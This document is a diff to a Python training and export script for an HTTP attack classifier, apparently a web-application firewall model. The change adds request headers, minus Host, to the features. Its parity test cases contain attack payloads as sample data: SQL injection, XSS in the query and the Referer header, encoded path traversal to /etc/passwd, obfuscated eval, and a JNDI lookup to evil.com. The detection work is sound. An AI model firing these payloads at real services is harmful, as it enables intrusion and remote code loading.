@@ -14,7 +14,9 @@
 
 刻意排除 Host / 客户端 IP / User-Agent 作为特征:BlazeHTTP 黑样本多打同一
 靶机,把这些放进特征会让模型学到"目标=某IP 即攻击"的数据集 artifact(泄漏),
-而非真实 payload 信号。
+而非真实 payload 信号。2026-07 起把其余请求头(Referer/Cookie 等可能携带
+真实攻击 payload 的头,与 rules.rs 的检测面对齐)纳入特征,但仍在
+feature_text_from_parts 内部过滤掉 Host 行,避免上述泄漏问题。
 
 用法:
   train       <样本目录> --model m.npz    # 首次训练(在训练集上)
@@ -61,18 +63,33 @@ def _percent_decode_once(s: str) -> str:
     return "".join(out)
 
 
-def feature_text_from_parts(method: str, path: str, query: str, body_txt: str) -> str:
-    """特征文本拼接(parity 基准):method+path+query+body → 原文 + 单遍解码,小写。
-    Rust 侧必须逐位镜像本函数。"""
+def _strip_host_header(headers_txt: str) -> str:
+    """去掉 Host 行,理由同模块开头说明:避免 BlazeHTTP 单一靶机 Host 造成的
+    数据集 artifact 泄漏,而非学习真实 payload 信号。Rust 侧 strip_host_header
+    必须逐位镜像本函数的过滤逻辑。"""
+    lines = []
+    for line in headers_txt.split("\n"):
+        name = line.split(":", 1)[0].strip() if ":" in line else line
+        if name.lower() == "host":
+            continue
+        lines.append(line)
+    return "\n".join(lines)
+
+
+def feature_text_from_parts(method: str, path: str, query: str, body_txt: str, headers_txt: str = "") -> str:
+    """特征文本拼接(parity 基准):method+path+query+body+headers(去 Host)→
+    原文 + 单遍解码,小写。Rust 侧必须逐位镜像本函数,含 Host 过滤逻辑。
+    headers_txt 约定不含 User-Agent(与 Rust RequestSummary.headers 定义一致)。"""
     body_txt = body_txt[:4096]
-    raw_text = f"{method} {path} {query} {body_txt}"
+    headers_txt = _strip_host_header(headers_txt)[:4096]
+    raw_text = f"{method} {path} {query} {body_txt} {headers_txt}"
     decoded = _percent_decode_once(raw_text)
     return (raw_text + " " + decoded).lower()
 
 
 def extract_text(raw: bytes) -> str:
-    """从原始 HTTP 请求提取分类特征文本:method + path + query + body,
-    URL 单遍解码,小写。刻意不含 Host/IP/UA。"""
+    """从原始 HTTP 请求提取分类特征文本:method + path + query + body + headers
+    (不含 User-Agent,feature_text_from_parts 内部再过滤掉 Host),URL 单遍解码,小写。"""
     head, body = _split_head_body(raw)
     lines = head.split(b"\n")
     reqline = lines[0].decode("utf-8", "replace").strip()
@@ -84,7 +101,19 @@ def extract_text(raw: bytes) -> str:
     else:
         path, query = target, ""
     body_txt = body[:4096].decode("utf-8", "replace")
-    return feature_text_from_parts(method, path, query, body_txt)
+
+    header_lines = []
+    for header_line in lines[1:]:
+        line_str = header_line.decode("utf-8", "replace").strip()
+        if not line_str:
+            continue
+        name = line_str.split(":", 1)[0].strip() if ":" in line_str else line_str
+        if name.lower() == "user-agent":
+            continue
+        header_lines.append(line_str)
+    headers_txt = "\n".join(header_lines)
+
+    return feature_text_from_parts(method, path, query, body_txt, headers_txt)
 
 
 def hash_features(text: str) -> dict:
@@ -279,26 +308,29 @@ def cmd_export(model_path):
         f.write(m.w.astype("<f4").tobytes())
     print(f"导出 {binpath}(D={D}, bias={m.b:.6f}, {os.path.getsize(binpath)} 字节)")
 
-    # parity 黄金样本:(method,path,query,body) → 期望 feature_text + score。
+    # parity 黄金样本:(method,path,query,body,headers) → 期望 feature_text + score。
     # Rust 做完整端到端:拼接→单遍解码→小写→crc32 哈希→L2→sigmoid,逐条对齐。
-    # 覆盖:SQLi、XSS、路径穿越(编码)、hex 转义混淆、中文、+ 号、jndi、正常流量。
+    # 覆盖:SQLi、XSS、路径穿越(编码)、hex 转义混淆、中文、+ 号、jndi、正常流量、
+    # 请求头带 payload(Referer XSS)、请求头带 Host(验证 Host 被过滤掉)。
     cases = [
-        ("GET", "/items", "q=1 union select name from t", ""),
-        ("GET", "/search", "name=<script>alert(1)</script>", ""),
-        ("GET", "/a", "x=%2e%2e%2f%2e%2e%2fetc/passwd", ""),
-        ("POST", "/login", "", "user=admin&pass=1' or '1'='1"),
-        ("GET", "/p", "id=42&sort=price", ""),
-        ("GET", "/vulnerabilities/xss_r/", "name=parent[%27%5cx65%5cx76%5cx61%5cx6c%27]", ""),
-        ("GET", "/ref", "q=union+select+关键字", ""),
-        ("GET", "/", "x=${jndi:ldap://evil.com/a}", ""),
+        ("GET", "/items", "q=1 union select name from t", "", ""),
+        ("GET", "/search", "name=<script>alert(1)</script>", "", ""),
+        ("GET", "/a", "x=%2e%2e%2f%2e%2e%2fetc/passwd", "", ""),
+        ("POST", "/login", "", "user=admin&pass=1' or '1'='1", ""),
+        ("GET", "/p", "id=42&sort=price", "", ""),
+        ("GET", "/vulnerabilities/xss_r/", "name=parent[%27%5cx65%5cx76%5cx61%5cx6c%27]", "", ""),
+        ("GET", "/ref", "q=union+select+关键字", "", ""),
+        ("GET", "/", "x=${jndi:ldap://evil.com/a}", "", ""),
+        ("GET", "/", "", "", "Referer: http://x/?q=<script>alert(1)</script>"),
+        ("GET", "/p", "id=42", "", "Host: 10.10.3.128:2280\nCookie: session=1' or '1'='1"),
     ]
     golden = []
-    for method, path, query, body in cases:
-        ft = feature_text_from_parts(method, path, query, body)
+    for method, path, query, body, headers in cases:
+        ft = feature_text_from_parts(method, path, query, body, headers)
         feats = hash_features(ft)
         golden.append({
             "method": method, "path": path, "query": query, "body": body,
-            "feature_text": ft, "score": float(m.score(feats)),
+            "headers": headers, "feature_text": ft, "score": float(m.score(feats)),
         })
     ppath = os.path.join(outdir, "parity.json")
     with open(ppath, "w") as f:
@@ -327,7 +359,8 @@ def cmd_update_gaps(gaps_path, model_path, whites_dir, n_neg):
             except json.JSONDecodeError:
                 continue
             ft = feature_text_from_parts(r.get("method", ""), r.get("path", ""),
-                                         r.get("query", ""), r.get("body", ""))
+                                         r.get("query", ""), r.get("body", ""),
+                                         r.get("headers", ""))
             pos.append((hash_features(ft), 1))
     if not pos:
         print(f"错误: {gaps_path} 无可用缺口样本"); return
